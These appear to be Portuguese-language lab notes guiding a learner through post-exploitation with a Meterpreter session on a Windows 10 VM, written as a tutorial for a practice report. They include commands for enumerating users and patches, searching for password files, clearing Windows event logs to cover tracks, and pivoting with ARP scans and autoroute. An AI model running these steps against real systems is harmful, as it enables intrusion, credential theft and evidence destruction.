- [ ] ### 1. Limpando a Visão

No terminal onde o Meterpreter está rodando, use:

- **CTRL + L**: Isso vai limpar o scroll do terminal e deixar a tela limpa para você começar a coleta de dados sem distrações.
    

---
📼 Como gravar sua sessão de "Hacker"
No seu terminal do Ubuntu ou no seu Debian de ataque, antes de começar a varredura, faça o seguinte:

Inicie a gravação:
Bash

```
script -a enumeration_win10.log
```

O -a serve para "append" (anexar), assim você não apaga o que já gravou se cair a conexão.

Tudo o que você digitar no Meterpreter agora será salvo nesse arquivo de texto.

---
Dica técnica: Como você está no Meterpreter, se quiser um log automático do próprio Metasploit, você pode usar este comando dentro do msfconsole:

Bash
```
spool relatorio_completo.txt
sessions -i 
```

Tudo o que aparecer no console a partir daí vai direto para o arquivo .txt. Para parar, é só digitar spool off.

---

### 2. Comandos de Enumeração (Direto no Meterpreter)

Rode estes comandos e copie as saídas para o seu documento `.md`:

- **Informações do Sistema:**
    
    Bash
    
    ```
    sysinfo
    ```
    
    _(Aqui você confirma que é o Win10-Lab, a arquitetura x64 e o domínio/grupo de trabalho)._
    
- **Identidade e Privilégios:**
    
    Bash
    
    ```
    getuid
    ```
    
    _(Para saber se você é o usuário comum ou se já escalou)._
    
- **Interfaces de Rede (Crucial para o seu Pivoting futuro):**
    
    Bash
    
    ```
    ipconfig
    ```
    
    _(Documente o IP interno e a máscara de rede. É aqui que você prova que está dentro da rede do laboratório)._
    
- **Conexões Ativas (O que o Windows está acessando agora):**
    
    Bash
    
    ```
    netstat
    ```
    
    _(Veja se ele já tem alguma conversa aberta com o seu Server ADDS ou com o Macbook)._
    

---

### 3. Enumeração de Softwares (O que tem instalado?)

Para o seu relatório ficar completo, é bom saber o que está rodando no Windows. Use o comando:

Bash

```
ps
```

_(Procure por processos de antivírus, navegadores abertos ou ferramentas de gestão que possam ter vulnerabilidades)._

---
**Um toque de mestre (Enumeração de usuários):** Rode também o comando:

Bash

```
shell
```

_Isso vai te dar o CMD do Windows._ Lá dentro, digite:

DOS

```
net user
net localgroup administrators
exit
```

_(O `exit` te traz de volta para o Meterpreter)._ Isso serve para você saber quais outros usuários existem na máquina e quem tem poder de admin.

---
### 1. Enumeração de Defesas (O que está nos barrando?)

No Meterpreter, rode:

Bash

```
run checkvm
```

_(Para confirmar se o Windows sabe que é uma VM — isso muda como o malware se comporta)._

Depois, entre no **shell** e veja o status do Firewall:

DOS

```
shell
netsh advfirewall show allprofiles
exit
```

> **Por que fazer:** No relatório, é importante dizer se o Firewall estava ligado ou se você conseguiu "cegar" o Defender.

---

### 2. Caça aos Arquivos Sensíveis (Onde estão os segredos?)

Um atacante quer dados. Use o comando `search` do Meterpreter para procurar por arquivos que um usuário comum (como um luthier) teria:

Bash

```
search -f *.pdf
search -f *.docx
search -f *senha*
```

> **Por que fazer:** Se você achar um PDF sobre "Orçamento_Luthieria.pdf", isso vira uma **prova de impacto** (Exfiltração de Dados) no seu relatório.

---

### 3. Enumeração de Patches (O sistema está "furado"?)

No **shell**, rode:

DOS

```
shell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix(s)"
exit
```

> **Por que fazer:** Isso mostra quais atualizações de segurança o Windows tem. Se tiver poucas, você justifica no relatório que a máquina estava vulnerável por falta de manutenção (Patch Management).

---
1. O jeito padrão (via Console)
Coloque a sessão em segundo plano e chame o módulo específico:

Bash
meterpreter > background
msf exploit(multi/handler) > use post/windows/gather/checkvm
msf post(windows/gather/checkvm) > set SESSION 1
msf post(windows/gather/checkvm) > run
2. O jeito rápido (Diretamente no Meterpreter)
Você também pode rodar módulos sem sair da sessão usando o comando run post/...:

Bash
meterpreter > run post/windows/gather/checkvm

---
💡 Próximo Passo da Enumeração
Depois de confirmar a VM, não esquece de rodar aquele comando no shell para ver o Firewall, que é o que realmente pode travar seu movimento lateral para o ADDS:

Bash
meterpreter > shell
C:\Windows\system32> netsh advfirewall show allprofiles

---
1. Corrigindo a Enumeração de Usuários (No Shell)
Entre no shell de novo e use o nome em português:

Bash
meterpreter > shell
C:\Windows\system32> net localgroup Administradores
C:\Windows\system32> exit
(Isso vai listar quem manda na máquina).

2. Rodando o checkvm do jeito certo (Sem sair do Meterpreter)
Para não precisar digitar background e depois use post/..., use este comando único que o Meterpreter aceita para rodar módulos:

Bash
meterpreter > run post/windows/gather/checkvm
Nota: Não digite msf ou meterpreter > no começo do comando, digite apenas run post/windows/gather/checkvm.

3. Por que deu erro nos comandos msf?
Você tentou digitar o prompt inteiro! Por exemplo:

Errado: meterpreter > msf exploit(multi/handler) > use...

Certo: Se quiser sair da sessão, digite apenas background. Se quiser rodar o módulo de dentro da sessão, digite apenas run post/windows/gather/checkvm.

---
1. O "Salto" (Pivoting Interno)
Do próprio Meterpreter, você pode ver quem mais está na rede sem precisar ligar o ADDS. No Meterpreter, rode:

Bash
```
arp
```

Por que fazer: O comando arp mostra o cache de máquinas que o Windows 10 "conversou" recentemente. Se o IP do Macbook ou do Server aparecer ali, você já documenta que eles se enxergam.

---

1. Listar Serviços Rodando (Para buscar CVEs de Softwares):

Bash
shell
```
wmic service get name,displayname,pathname,startmode | findstr /i "Running"
exit
```

Por que isso? Muitos ataques não são no Windows em si, mas em serviços de terceiros (um agente de backup, um serviço de atualização, etc.). Se você encontrar um caminho de arquivo com espaço e sem aspas, temos um "Unquoted Service Path" — uma falha clássica!

2. Verificar Patches de Segurança (Hotfixes):

Bash
shell
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
exit
```

Por que isso? Se a lista de Hotfixes for pequena ou muito antiga, na próxima fase você pode pesquisar se existe uma CVE de Escalação de Privilégio (tipo um PrintNightmare ou DirtyPipe se fosse Linux) baseada no que não foi instalado.

📝 Finalizando o seu win10_enumeration.md
Com esses dados, seu arquivo no Obsidian está pronto para ser fechado. A estrutura final que eu sugiro é:

System Information (sysinfo, checkvm) - Confirmado: VM VirtualBox.

User Context (getuid, net user) - Confirmado: Sistema em pt-BR.

Network Footprint (netstat, ipconfig) - Confirmado: Sessão ativa na porta 4444.

Enumerated Services (wmic service) - Lista de alvos para a fase de vulnerabilidades.

💾 Dica para o seu Log (spool)
Depois que rodar esses últimos comandos, você já pode desligar a gravação:

background

spool off

---
Finalizar uma sessão de **Meterpreter** com segurança é um passo crítico, tanto para a saúde do seu laboratório (evitar que o processo trave e consuma seus 8GB de RAM) quanto para a simulação de **Red Team** (não deixar rastros óbvios).

Aqui está o procedimento operacional padrão para encerrar tudo "limpo":

### 1. Limpeza de Logs (Opcional, mas Profissional)

Se o seu objetivo é simular um ataque real onde o invasor tenta esconder a presença, antes de sair, você pode rodar:

Bash

```
meterpreter > clearev
```

- **O que faz:** Limpa os logs de Application, System e Security do Windows.
    
- **Nota:** No seu relatório, você pode citar isso como a fase de **"Covering Tracks"** (Cobertura de Rastros).
    

### 2. Encerrando a Sessão de Forma Correta

Não feche apenas a janela do terminal! Use os comandos internos para que o processo `WindowsUpdater.exe` no Windows e o `handler` no Linux terminem a comunicação graciosamente.

- **Para fechar a sessão e matar o processo no alvo:**
    
    Bash
    
    ```
    meterpreter > exit
    ```
    
    _Isso encerra o Meterpreter e, dependendo de como o payload foi gerado, finaliza o processo no Windows, liberando RAM._
    
- **Para fechar o Metasploit por completo:** Após sair da sessão e voltar para o prompt `msf6 >`:
    
    Bash
    
    ```
    msf6 > exit -y
    ```
    

---

### 3. Verificação de "Zumbis" (Gestão de RAM - 8GB)

Como você está com recursos limitados, é importante garantir que nada ficou rodando escondido no seu **Ubuntu (Host)**.

1. No terminal do Ubuntu, verifique se ainda há processos do Metasploit:
    
    Bash
    
    ```
    ps aux | grep msf
    ```
    
2. Se houver algo travado, você pode matar o processo para recuperar memória:
    
    Bash
    
    ```
    killall -9 ruby
    ```
    
    _(O Metasploit roda sobre Ruby, então isso limpa qualquer resquício)._
    

---

### 4. Salvando o Estado da VM

Agora que o ataque foi encerrado no nível de software:

1. Vá ao **VirtualBox**.
    
2. Se você não for mais mexer no Windows 10 hoje, escolha **"Salvar o estado da máquina"** (Save State). Isso é melhor que desligar, pois quando você abrir de novo, estará exatamente onde parou, sem precisar carregar todo o boot do Windows (poupando tempo e esforço do disco).

3. O que fazer para "forçar" a aparição deles?
Como você já tem uma sessão Meterpreter no Windows, você pode usar o Windows como um "pivô":

Varredura Ativa (ARP Scanner): Dentro do MSF, use o módulo post/windows/gather/arp_scanner. Ele vai forçar o Windows a gritar na rede perguntando "Quem é o IP tal?", e aí o cache ARP vai ser populado.

Ping Sweep: No shell do Windows, você pode rodar um comando rápido para pingar a rede toda:
for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find "Reply"

Autoroute: No Meterpreter, use o comando run autoroute -s 192.168.1.0/24. Isso diz ao Metasploit para enviar qualquer tráfego para essa rede através do Windows comprometido.

Dica de Elite: No seu próximo relatório, você pode citar isso como uma "Lacuna de Visibilidade Passiva", justificando a necessidade de passar para a "Enumeração Ativa" (Tactic: Network Service Scanning - T1046) para descobrir esses hosts ocultos.